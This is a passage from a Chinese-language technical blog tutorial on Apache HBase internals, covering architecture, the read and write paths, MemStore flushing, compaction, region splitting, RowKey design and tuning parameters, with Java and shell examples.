class="comment">// 2.创建 Delete 对象</span></span><br><span class="line">    Delete delete = <span class="keyword">new</span> Delete(Bytes.toBytes(rowKey));</span><br><span class="line">    <span class="comment">// 3.添加删除信息</span></span><br><span class="line">    <span class="comment">// 3.1 删除单个版本</span></span><br><span class="line">    delete.addColumn(Bytes.toBytes(family),Bytes.toBytes(column));</span><br><span class="line">    <span class="comment">// 3.2 删除所有版本</span></span><br><span class="line">    delete.addColumns(Bytes.toBytes(family), Bytes.toBytes(column));</span><br><span class="line">    <span class="comment">// 3.3 删除列族</span></span><br><span class="line">    <span class="comment">// delete.addFamily(Bytes.toBytes(family));</span></span><br><span class="line">    <span class="comment">// 3.删除数据</span></span><br><span class="line">    table.delete(delete);</span><br><span class="line">    <span class="comment">// 5.关闭资源</span></span><br><span class="line">    table.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>四、HBase 原理分析</h1><blockquote><p>官方文档：<a href="https://hbase.apache.org/2.4/book.html" target="_blank" rel="noopener" title="https://hbase.apache.org/2.4/book.html">https://hbase.apache.org/2.4/book.html</a></p></blockquote><h2 id="1、架构分析">1、架构分析</h2><h3 id="1-1-Master-架构">1.1 Master 架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151820792.png" alt></p><p>Meta 表格介绍：（<strong>警告：不要去改这个表</strong>），全称 hbase：meta，只是在 list 命令中被过滤掉了，本质上和 HBase 的其他表格一样。</p><p><strong>RowKey：</strong></p><ul><li>([table],[region start key],[region id]) 即 表名，region 起始位置和 regionID</li></ul><p><strong>列：</strong></p><ul><li>info：regioninfo 为 region 信息，存储一个 HRegionInfo 对象</li><li>info：server 当前 region 所处的 RegionServer 信息，包含端口号</li><li>info：serverstartcode 当前 region 被分到 RegionServer 的起始时间</li></ul><p>如果一个表处于切分的过程中，即 region 切分，还会多出两列 info：splitA 和 info：splitB，存储值也是 HRegionInfo 对象，拆分结束后，删除这两列。</p><p><strong>注意</strong>：在客户端对元数据进行操作的时候才会连接 master，如果对数据进行读写，直接连接zookeeper 读取目录<code>/hbase/meta-region-server</code> 节点信息，会记录 meta 表格的位置。直接读取即可，不需要访问 master，这样可以减轻 master 的压力，相当于 master 专注 meta 表的写操作，客户端可直接读取 meta 表。在 HBase 的 2.3 版本更新了一种新模式：Master Registry。客户端可以访问 master 来读取meta 表信息。加大了 master 的压力，减轻了 zookeeper 的压力。<strong>HMaster仅仅维护者table和HRegion的元数据信息，负载很低</strong></p><p><strong>总结：</strong></p><ul><li>为Region server分配region</li><li><strong>负责region server的负载均衡</strong></li><li>发现失效的region server并重新分配其上的region</li><li>HDFS上的垃圾文件回收</li><li>处理schema更新请求</li></ul><h3 id="1-2-RegionServer-架构">1.2 RegionServer 架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151820793.png" alt></p><ul><li>HRegion server<strong>维护HMaster分配给它的region</strong>，处理对这些region的IO请求</li><li>HRegion server负责切分在运行过程中变得过大的region 从图中可以看到，<strong>Client访问HBase上数据的过程并不需要HMaster参与</strong>（寻址访问Zookeeper和HRegion server，数据读写访问HRegione server）</li></ul><p>一些组件介绍</p><ul><li><strong>MemStore</strong></li></ul><p>写缓存，由于 HFile 中的数据要求是有序的，所以数据是先存储在 MemStore 中，排好序后，等到达刷写时机才会刷写到 HFile，每次刷写都会形成一个新的 HFile，写入到对应的文件夹 store 中。</p><p><strong>一个 HRegion 由多个 Store 组成，每个 Store 包含一个列族的所有数据 Store 包括位于内存的 Memstore 和位于硬盘的 StoreFile</strong></p><ul><li><strong>WAL</strong></li></ul><p>由于数据要经 MemStore 排序后才能刷写到 HFile，但把数据保存在内存中会有很高的概率导致数据丢失，为了解决这个问题，数据会先写在一个叫做 Write-Ahead logfile 的文件中，然后再写入 MemStore 中。所以在系统出现故障的时候，数据可以通过这个日志文件重建</p><p><strong>每个Region Server维护一个Hlog，而不是每个Region一个</strong>。这样不同region(来自不同table)的日志会混在一起，这样做的目的是不断追加单个文件相对于同时写多个文件而言，可以减少磁盘寻址次数，<strong>因此可以提高对table的写性能</strong>。带来的麻烦是，如果一台region server下线，为了<strong>恢复其上的region，需要将region server上的log进行拆分</strong>，然后分发到其它region server上进行恢复</p><ul><li><strong>BlockCache</strong></li></ul><p>读缓存，每次查询出的数据会缓存在 BlockCache 中，方便下次查询</p><h2 id="2、HRegion管理和HMaster工作机制">2、HRegion管理和HMaster工作机制</h2><h3 id="2-1-HRegion管理">2.1 HRegion管理</h3><ul><li><strong>HRegion分配</strong></li></ul><p>任何时刻，<strong>一个HRegion只能分配给一个HRegion Server</strong>。HMaster记录了当前有哪些可用的HRegion Server。以及当前哪些HRegion分配给了哪些HRegion Server，哪些HRegion还没有分配。当需要分配的新的HRegion，并且有一个HRegion Server上有可用空间时，HMaster就给这个HRegion Server发送一个装载请求，把HRegion分配给这个HRegion Server。HRegion Server得到请求后，就开始对此HRegion提供服务。</p><ul><li><strong>HRegion Server上线</strong></li></ul><p><strong>HMaster使用zookeeper来跟踪HRegion Server状态</strong>。当某个HRegion Server启动时，会首先在zookeeper上的server目录下建立代表自己的znode。由于HMaster订阅了server目录上的变更消息，当server目录下的文件出现新增或删除操作时，HMaster可以得到来自zookeeper的实时通知。因此一旦HRegion Server上线，HMaster能马上得到消息。</p><ul><li><strong>HRegion Server下线</strong></li></ul><p>当HRegion Server下线时，它和zookeeper的会话断开，zookeeper而自动释放代表这台server的文件上的独占锁。HMaster就可以确定：</p><ol><li>HRegion Server和zookeeper之间的网络断开了。</li><li>HRegion Server挂了。</li></ol><p>无论哪种情况，HRegion Server都无法继续为它的HRegion提供服务了，此时HMaster会删除server目录下代表这台HRegion Server的znode数据，并将这台HRegion Server的HRegion分配给其它还活着的节点</p><h3 id="2-2-HMaster工作机制">2.2 HMaster工作机制</h3><ul><li><strong>master上线</strong></li></ul><p>master启动进行以下步骤:</p><ol><li>从zookeeper上<strong>获取唯一一个代表active master的锁</strong>，用来阻止其它HMaster成为master。</li><li>扫描zookeeper上的server父节点，获得当前可用的HRegion Server列表。</li><li>和每个HRegion Server通信，获得当前已分配的HRegion和HRegion Server的对应关系。</li><li>扫描.META.region的集合，计算得到当前还未分配的HRegion，将他们放入待分配HRegion列表。</li></ol><ul><li><strong>master下线</strong></li></ul><p>由于<strong>HMaster只维护表和region的元数据</strong>，而不参与表数据IO的过程，HMaster下线仅导致所有元数据的修改被冻结(无法创建删除表，无法修改表的schema，无法进行HRegion的负载均衡，无法处理HRegion 上下线，无法进行HRegion的合并，唯一例外的是HRegion的split可以正常进行，因为只有HRegion Server参与)，<strong>表的数据读写还可以正常进行</strong>。因此<strong>HMaster下线短时间内对整个HBase集群没有影响</strong>。</p><p>从上线过程可以看到，HMaster保存的信息全是可以冗余信息（都可以从系统其它地方收集到或者计算出来）因此，一般HBase集群中总是有一个HMaster在提供服务，还有一个以上的‘HMaster’在等待时机抢占它的位置</p><h2 id="3、写流程">3、写流程</h2><p><img src="http://qnypic.shawncoding.top/blog/202404151820794.png" alt></p><p>写流程顺序正如 API 编写顺序，首先创建 HBase 的重量级连接</p><ul><li>首先访问 zookeeper，获取 hbase:meta 表位于哪个 Region Server；</li><li>访问对应的 Region Server，<strong>获取 hbase:meta 表，将其缓存到连接中</strong>，作为连接属性 MetaCache，由于 Meta 表格具有一定的数据量，导致了创建连接比较慢；之后<strong>使用创建的连接获取 Table</strong>，这是一个轻量级的连接，只有在第一次创建的时候会检查表格是否存在访问 RegionServer，之后在获取 Table 时不会访问 RegionServer；</li><li>调用Table的put方法写入数据，此时还需要解析RowKey，对照缓存的MetaCache，查看具体写入的位置有哪个 RegionServer；</li><li>将数据顺序写入（追加）到 WAL，此处写入是直接落盘的，并设置专门的线程控制 WAL 预写日志的滚动（类似 Flume）；根据写入命令的 RowKey 和 ColumnFamily 查看具体写入到哪个 MemStory，并且在 MemStory 中排序；</li><li>向客户端发送 ack；</li><li>等达到 MemStore 的刷写时机后，将数据刷写到对应的 story 中</li></ul><p>HBase使用MemStore和StoreFile存储对表的更新。 数据在更新时首先写入Log(WAL log)和内存(MemStore)中，MemStore中的数据是排序的，<strong>当MemStore累计到一定阈值时，就会创建一个新的MemStore</strong>，并且将老的MemStore添加到flush队列，由单独的线程flush到磁盘上，成为一个StoreFile。于此同时，系统会在zookeeper中记录一个redo point，表示这个时刻之前的变更已经持久化了。 当系统出现意外时，可能导致内存(MemStore)中的数据丢失，此时使用Log(WAL log)来恢复checkpoint之后的数据。</p><p><strong>StoreFile是只读的，一旦创建后就不可以再修改。因此HBase的更新其实是不断追加的操作。当一个Store中的StoreFile达到一定的阈值后，就会进行一次合并(minor_compact, major_compact),将对同一个key的修改合并到一起，形成一个大的StoreFile，当StoreFile的大小达到一定阈值后，又会对 StoreFile进行split，等分为两个StoreFile。</strong></p><p>由于对表的更新是不断追加的，compact时，需要访问Store中全部的 StoreFile和MemStore，将他们按row key进行合并，由于StoreFile和MemStore都是经过排序的，并且StoreFile带有内存中索引，合并的过程还是比较快</p><h2 id="4、MemStore-Flush">4、MemStore Flush</h2><blockquote><p><strong>MemStore 刷写由多个线程控制，条件互相独立</strong>，主要的刷写规则是控制刷写文件的大小，在每一个刷写线程中都会进行监控</p></blockquote><p><strong>刷写规则一</strong></p><p>当某个 memstroe 的大小达到了 <code>hbase.hregion.memstore.flush.size</code>（默认值 128M），其所在 region 的所有 memstore 都会刷写。当 memstore 的大小达到了</p><ul><li><code>hbase.hregion.memstore.flush.size</code>（默认值 128M）</li><li><code>hbase.hregion.memstore.block.multiplier</code>（默认值 4）</li></ul><p>时，会刷写<strong>同时阻止</strong>继续往该 memstore 写数据（由于线程监控是周期性的，所有有可能面对数据洪峰，尽管可能性比较小）</p><p><strong>刷写规则二</strong></p><p>由 <strong>HRegionServer</strong> 中的属性 <strong>MemStoreFlusher</strong> 内部线程 FlushHandler 控制。标准为**LOWER_MARK（低水位线）**和 <strong>HIGH_MARK（高水位线）</strong>，意义在于避免写缓存使用过多的内存造成 OOM</p><p>当 region server 中 memstore 的总大小达到低水位线：</p><ul><li><code>java_heapsize</code></li><li><code>hbase.regionserver.global.memstore.size</code>（默认值 0.4）</li><li><code>hbase.regionserver.global.memstore.size.lower.limit</code>（默认值 0.95，强制刷新之前区域服务器中所有内存的最大大小。默认为hbase.regionserver.global. memory .size(0.95)的95%。如果此值为100%，则在由于内存存储限制而阻塞更新时，会发生最小可能的刷新）</li></ul><p>region 会按照其所有 memstore 的大小顺序（由大到小）依次进行刷写。直到 region server中所有 memstore 的总大小减小到上述值以下</p><p>当 region server 中 memstore 的总大小达到高水位线：</p><ul><li><code>java_heapsize</code></li><li><code>hbase.regionserver.global.memstore.size</code>（默认值 0.4）</li></ul><p>时，会同时阻止继续往所有的 memstore 写数据</p><p><strong>刷写规则三</strong></p><p>为了避免数据过长时间处于内存之中，到达自动刷写的时间，也会触发 memstoreflush。由 HRegionServer 的属性 PeriodicMemStoreFlusher 控制进行，由于重要性比较低，5min才会执行一次。自动刷新的时间间隔由该属性进行配置<code>hbase.regionserver.optionalcacheflushinterval</code>（默认1 小时）</p><p><strong>刷写规则四</strong></p><p>当 WAL 文件的数量超过 <code>hbase.regionserver.max.logs</code>，region 会按照时间顺序依次进行刷写，直到 WAL 文件数量减小到 <code>hbase.regionserver.max.log</code> 以下（该属性名已经废弃，现无需手动设置，最大值为 32）</p><h2 id="5、读流程">5、读流程</h2><h3 id="5-1-HFile-结构">5.1 HFile 结构</h3><p>HFile 是存储在 HDFS 上面每一个 store 文件夹下实际存储数据的文件。里面存储多种内容。包括数据本身（<strong>keyValue 键值对</strong>）、元数据记录、文件信息、<strong>数据索引</strong>、元数据索引和一个固定长度的尾部信息（记录文件的修改情况）。</p><p><strong>键值对</strong>按照块大小（默认 64K）保存在文件中，<strong>数据索引</strong>按照块创建，块越多，索引越大。每一个 HFile 还会维护一个<strong>布隆过滤器</strong>（就像是一个很大的地图，文件中每有一种 key，就在对应的位置标记，读取时可以大致判断要 get 的 key 是否存在 HFile 中）。KeyValue 内容如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rowlength -----------→ key 的长度</span><br><span class="line">row -----------------→ key 的值</span><br><span class="line">columnfamilylength --→ 列族长度</span><br><span class="line">columnfamily --------→ 列族</span><br><span class="line">columnqualifier -----→ 列名</span><br><span class="line">timestamp -----------→ 时间戳（默认系统时间）</span><br><span class="line">keytype -------------→ Put</span><br></pre></td></tr></table></figure><p>由于 HFile 存储经过序列化，所以无法直接查看。可以通过 HBase 提供的命令来查看存储在 HDFS 上面的 HFile 元数据内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/hbase hfile -m -f /hbase/data/命名空间/表名/regionID/列族/HFile名</span><br></pre></td></tr></table></figure><h3 id="5-2-读流程">5.2 读流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151820795.png" alt></p><p>创建连接同写流程。</p><ul><li>创建 Table 对象发送 get 请求</li><li>优先访问 Block Cache，查找是否之前读取过，并且可以读取 HFile 的索引信息和布隆过滤器</li><li>不管读缓存中是否已经有数据了（可能已经过期了），都需要再次读取写缓存和store 中的文件</li><li>最终将所有读取到的数据合并版本，按照 get 的要求返回即可</li></ul><h3 id="5-3-合并读取数据优化">5.3 合并读取数据优化</h3><p>每次读取数据都需要读取三个位置，最后进行版本的合并。效率会非常低，所有系统需要对此优化</p><ul><li>HFile 带有索引文件，读取对应 RowKey 数据会比较快</li><li>Block Cache 会缓存之前读取的内容和元数据信息，如果 HFile 没有发生变化（记录在 HFile 尾信息中），则不需要再次读取</li><li>使用布隆过滤器能够快速过滤当前 HFile 不存在需要读取的 RowKey，从而避免读取文件。（布隆过滤器使用 HASH 算法，不是绝对准确的，出错会造成多扫描一个文件，对读取数据结果没有影响）</li></ul><h2 id="6、StoreFile-Compaction">6、StoreFile Compaction</h2><p>由于 memstore 每次刷写都会生成一个新的 HFile，文件过多读取不方便，所以会进行文件的合并，清理掉过期和删除的数据，会进行 StoreFile Compaction。</p><p>Compaction 分为两种，分别是 <strong>Minor Compaction</strong> 和** Major Compaction**。Minor Compaction会将临近的若干个较小的 HFile 合并成一个较大的 HFile，并<strong>清理掉部分过期和删除的数据</strong>，有系统使用一组参数自动控制，Major Compaction 会将一个 Store 下的所有的 HFile 合并成一个大 HFile，并且<strong>会清理掉所有过期和删除的数据</strong>，由参数 <code>hbase.hregion.majorcompaction</code>控制，默认 7 天。</p><p><img src="http://qnypic.shawncoding.top/blog/202404151820796.png" alt></p><p>Minor Compaction 控制机制，参与到小合并的文件需要通过参数计算得到，有效的参数有 5 个</p><ul><li><code>hbase.hstore.compaction.ratio</code>（默认 1.2F）合并文件选择算法中使用的比率</li><li><code>hbase.hstore.compaction.min</code>（默认 3） 为 Minor Compaction 的最少文件个数</li><li><code>hbase.hstore.compaction.max</code>（默认 10） 为 Minor Compaction 最大文件个数</li><li><code>hbase.hstore.compaction.min.size</code>（默认 128M）为单个 Hfile 文件大小最小值，小于这个数会被合并</li><li><code>hbase.hstore.compaction.max.size</code>（默认 Long.MAX_VALUE）为单个 Hfile 文件大小最大值，高于这个数不会被合并</li></ul><p>小合并机制为拉取整个 store 中的所有文件，做成一个集合。之后按照从旧到新的顺序遍历。判断条件为：</p><ul><li>过小合并，过大不合并</li><li>文件大小 / <code>hbase.hstore.compaction.ratio</code> &lt; (剩余文件大小和) 则参与压缩。所有把比值设置过大，如 10 会最终合并为 1 个特别大的文件，相反设置为 0.4，会最终产生 4 个 storeFile。不建议修改默认值</li><li>满足压缩条件的文件个数达不到个数要求（3 &lt;= count &lt;= 10）则不压缩</li></ul><h2 id="7、Region-Split">7、Region Split</h2><p>Region 切分分为两种，创建表格时候的预分区即自定义分区，同时系统默认还会启动一个切分规则，避免单个 Region 中的数据量太大</p><h3 id="7-1-预分区（自定义分区）">7.1 预分区（自定义分区）</h3><p>每一个 region 维护着 startRow 与 endRowKey，如果加入的数据符合某个 region 维护的rowKey 范围，则该数据交给这个 region 维护。那么依照这个原则，我们可以将数据所要投放的分区提前大致的规划好，以提高 HBase 性能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手动设定预分区</span></span><br><span class="line">create <span class="string">'staff1'</span>,<span class="string">'info'</span>, SPLITS =&gt; [<span class="string">'1000'</span>,<span class="string">'2000'</span>,<span class="string">'3000'</span>,<span class="string">'4000'</span>]</span><br><span class="line"><span class="comment"># 生成 16 进制序列预分区</span></span><br><span class="line">create <span class="string">'staff2'</span>,<span class="string">'info'</span>,&#123;NUMREGIONS =&gt; 15, SPLITALGO =&gt; <span class="string">'HexStringSplit'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照文件中设置的规则预分区</span></span><br><span class="line"><span class="comment"># 创建 splits.txt 文件内容如下</span></span><br><span class="line">aaaa</span><br><span class="line">bbbb</span><br><span class="line">cccc</span><br><span class="line">dddd</span><br><span class="line"><span class="comment"># 然后执行</span></span><br><span class="line">create <span class="string">'staff3'</span>, <span class="string">'info'</span>,SPLITS_FILE =&gt; <span class="string">'splits.txt'</span></span><br></pre></td></tr></table></figure><p>最后一种方法是使用java API，不常用也不推荐</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseConnect</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="comment">// 1.获取配置类</span></span><br><span class="line">            Configuration conf = HBaseConfiguration.create();</span><br><span class="line">            <span class="comment">// 2.给配置类添加配置</span></span><br><span class="line"></span><br><span class="line">            conf.set(<span class="string">"hbase.zookeeper.quorum"</span>,<span class="string">"hadoop102,hadoop103,hadoop104"</span></span><br><span class="line">            );</span><br><span class="line">            <span class="comment">// 3.获取连接</span></span><br><span class="line">            Connection connection =</span><br><span class="line">                    ConnectionFactory.createConnection(conf);</span><br><span class="line">            <span class="comment">// 3.获取 admin</span></span><br><span class="line">            Admin admin = connection.getAdmin();</span><br><span class="line">            <span class="comment">// 5.获取 descriptor 的 builder</span></span><br><span class="line">            TableDescriptorBuilder builder =</span><br><span class="line">                    TableDescriptorBuilder.newBuilder(TableName.valueOf(<span class="string">"bigdata"</span>,</span><br><span class="line">                            <span class="string">"staff4"</span>));</span><br><span class="line">            <span class="comment">// 6. 添加列族</span></span><br><span class="line"></span><br><span class="line">            builder.setColumnFamily(ColumnFamilyDescriptorBuilder.newBuilder(</span><br><span class="line">                    Bytes.toBytes(<span class="string">"info"</span>)).build());</span><br><span class="line">            <span class="comment">// 7.创建对应的切分</span></span><br><span class="line">            <span class="keyword">byte</span>[][] splits = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">3</span>][];</span><br><span class="line">            splits[<span class="number">0</span>] = Bytes.toBytes(<span class="string">"aaa"</span>);</span><br><span class="line">            splits[<span class="number">1</span>] = Bytes.toBytes(<span class="string">"bbb"</span>);</span><br><span class="line">            splits[<span class="number">2</span>] = Bytes.toBytes(<span class="string">"ccc"</span>);</span><br><span class="line">            <span class="comment">// 8.创建表</span></span><br><span class="line">            admin.createTable(builder.build(),splits);</span><br><span class="line">            <span class="comment">// 9.关闭资源</span></span><br><span class="line">            admin.close();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="7-2-系统拆分">7.2 系统拆分</h3><p>Region 的拆分是由 HRegionServer 完成的，在操作之前需要通过 ZK 汇报 master，修改对应的 Meta 表信息添加两列 info：splitA 和 info：splitB 信息。之后需要操作 HDFS 上面对应的文件，按照拆分后的 Region 范围进行标记区分，<strong>实际操作为创建文件引用，不会挪动数据</strong>。刚完成拆分的时候，<strong>两个 Region 都由原先的RegionServer 管理</strong>。之后汇报给 Master，由Master将修改后的信息写入到Meta表中。等待下一次触发负载均衡机制，才会修改Region的管理服务者，而<strong>数据要等到下一次压缩时，才会实际进行移动</strong>。</p><p>不管是否使用预分区，系统都会默认启动一套 Region 拆分规则。不同版本的拆分规则有差别。系统拆分策略的父类为 RegionSplitPolicy。</p><ul><li><p>0.94 版本之前 =&gt; ConstantSizeRegionSplitPolicy</p><p>当 1 个 region 中 的 某 个 Store 下 所 有 StoreFile 的 总 大 小 超 过<br><code>hbase.hregion.max.filesize </code>（10G），该 Region 就会进行拆分</p></li><li><p>0.94 版本之后，2.0 版本之前 =&gt; IncreasingToUpperBoundRegionSplitPolicy</p><p>当 1 个 region 中 的 某 个 Store 下 所 有 StoreFile 的 总 大 小 超 过Min(initialSize*R^3 ,<code>hbase.hregion.max.filesize</code>&quot;)，该 Region 就会进行拆分。其中 initialSize 的默认值为 2*hbase.hregion.memstore.flush.size，R 为当前 Region Server 中属于该 Table 的Region 个数（0.94 版本之后），具体的切分策略为：</p><ul><li>第一次 split：1^3 * 256 = 256MB</li><li>第二次 split：2^3 * 256 = 2048MB</li><li>第三次 split：3^3 * 256 = 6912MB</li><li>第四次 split：4^3 * 256 = 16384MB &gt; 10GB，因此取较小的值 10GB</li><li>后面每次 split 的 size 都是 10GB 了。</li></ul></li><li><p>2.0 版本之后 =&gt; SteppingSplitPolicy</p><p>Hbase 2.0 引入了新的 split 策略：如果当前 RegionServer 上该表只有一个 Region，按照 2 * hbase.hregion.memstore.flush.size 分裂，否则按照 <code>hbase.hregion.max.filesize</code> 分裂</p></li></ul><h1>五、HBase 优化</h1><h2 id="1、RowKey-设计">1、RowKey 设计</h2><p>一条数据的唯一标识就是 rowkey，那么这条数据存储于哪个分区，取决于 rowkey 处于哪个一个预分区的区间内，设计 rowkey的主要目的 ，就是让数据均匀的分布于所有的 region中，在一定程度上防止数据倾斜。接下来我们就谈一谈 rowkey 常用的设计方案</p><ul><li>生成随机数、hash、散列值</li><li>时间戳反转</li><li>字符串拼接</li></ul><p>现在有一个需求，源数据如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user         data                    pay</span><br><span class="line">zhangsan     2022-01-05 09:08:00     100</span><br></pre></td></tr></table></figure><ul><li>统计张三在 2021 年 12 月份消费的总金额</li><li>统计所有人在 2021 年 12 月份消费的总金额</li></ul><h3 id="1-1-实现需求-1">1.1 实现需求 1</h3><p>为了能够统计张三在 2021 年 12 月份消费的总金额，我们需要用 scan 命令能够得到张三在这个月消费的所有记录，之后在进行累加即可。Scan 需要填写 startRow 和 stopRow：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scan : startRow -&gt; ^A^Azhangsan2021-12 </span><br><span class="line">       endRow -&gt; ^A^Azhangsan2021-12.</span><br></pre></td></tr></table></figure><ul><li>避免扫描数据混乱，解决字段长度不一致的问题，可以使用相同阿斯卡码值的符号进行填充，框架底层填充使用的是阿斯卡码值为 1 的^A</li><li>最后的日期结尾处需要使用阿斯卡码略大于’-'的值</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151820797.png" alt></p><p>最终得到 rowKey 的设计为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意 rowkey 相同的数据会视为相同数据覆盖掉之前的版本</span></span><br><span class="line">rowKey: userdate(yyyy-MM-dd HH:mm:SS)</span><br></pre></td></tr></table></figure><h3 id="1-2-实现需求-2">1.2 实现需求 2</h3><p>问题提出：按照需要 1 的 rowKey 设计，会发现对于需求 2，完全没有办法写 rowKey 的扫描范围。此处能够看出 hbase 设计 rowKey 使用的特点为：**适用性强 泛用性差 能够完美实现一个需求 但是不能同时完美实现多个需要。**如果想要同时完成两个需求，需要对 rowKey 出现字段的顺序进行调整。调整的原则为：可枚举的放在前面。其中时间是可以枚举的，用户名称无法枚举，所以必须把时间放在前面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最终满足 2 个需求的设计,可以穷举的写在前面即可</span></span><br><span class="line">rowKey 设计格式 =&gt; date(yyyy-MM)^A^Auserdate(-dd hh:mm:ss ms)</span><br><span class="line"><span class="comment">#（1）统计张三在 2021 年 12 月份消费的总金额</span></span><br><span class="line">scan: startRow =&gt; 2021-12^A^Azhangsan</span><br><span class="line">      stopRow =&gt; 2021-12^A^Azhangsan.</span><br><span class="line"><span class="comment">#（2）统计所有人在 2021 年 12 月份消费的总金额</span></span><br><span class="line">scan: startRow =&gt; 2021-12</span><br><span class="line">      stopRow =&gt; 2021-12.</span><br></pre></td></tr></table></figure><h3 id="1-3-添加预分区优化">1.3 添加预分区优化</h3><p>预分区的分区号同样需要遵守 rowKey 的 scan 原则。所有必须添加在 rowKey 的最前面，前缀为最简单的数字。同时使用 hash 算法将用户名和月份拼接决定分区号。（单独使用用户名会造成单一用户所有数据存储在一个分区）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加预分区优化</span></span><br><span class="line">startKey stopKey</span><br><span class="line">001</span><br><span class="line">001      002</span><br><span class="line">002      003</span><br><span class="line">...</span><br><span class="line">119      120</span><br><span class="line"><span class="comment"># 分区号=&gt; hash(user+date(MM)) % 120</span></span><br><span class="line"><span class="comment"># 分区号填充 如果得到 1 =&gt; 001</span></span><br><span class="line">rowKey 设计格式 =&gt; 分区号 date(yyyy-MM)^A^Auserdate(-dd hh:mm:ss ms)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缺点：实现需求 2 的时候，由于每个分区都有 12 月份的数据，需要扫描 120 个分区</span></span><br><span class="line"><span class="comment"># 解决方法：提前将分区号和月份进行对应</span></span><br><span class="line"><span class="comment"># 提前将月份和分区号对应一下</span></span><br><span class="line"><span class="comment">#000 到 009 分区 存储的都是 1 月份数据</span></span><br><span class="line"><span class="comment">#010 到 019 分区 存储的都是 2 月份数据</span></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"><span class="comment">#110 到 119 分区 存储的都是 12 月份数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#是 9 月份的数据</span></span><br><span class="line">分区号=&gt; <span class="built_in">hash</span>(user+date(MM)) % 10 + 80</span><br><span class="line">分区号填充 如果得到 85 =&gt; 085</span><br><span class="line"><span class="comment">#得到 12 月份所有人的数据,扫描 10 次</span></span><br><span class="line">scan: startRow =&gt; 1102021-12</span><br><span class="line">stopRow =&gt; 1102021-12.</span><br><span class="line">...</span><br><span class="line">startRow =&gt; 1122021-12</span><br><span class="line">stopRow =&gt; 1122021-12.</span><br><span class="line">..</span><br><span class="line">startRow =&gt; 1192021-12</span><br><span class="line">stopRow =&gt; 1192021-12.</span><br></pre></td></tr></table></figure><h2 id="2、参数优化">2、参数优化</h2><h3 id="2-1-Zookeeper-会话超时时间">2.1 Zookeeper 会话超时时间</h3><p>进入hbase-site.xml修改</p><ul><li>属性：zookeeper.session.timeout</li><li>解释：默认值为 90000 毫秒（90s）。当某个 RegionServer 挂掉，90s 之后 Master 才能察觉到。可适当减小此值，尽可能快地检测 regionserver 故障，可调整至 20-30s</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 看你能有都能忍耐超时，同时可以调整重试时间和重试次数</span></span><br><span class="line">hbase.client.pause（默认值 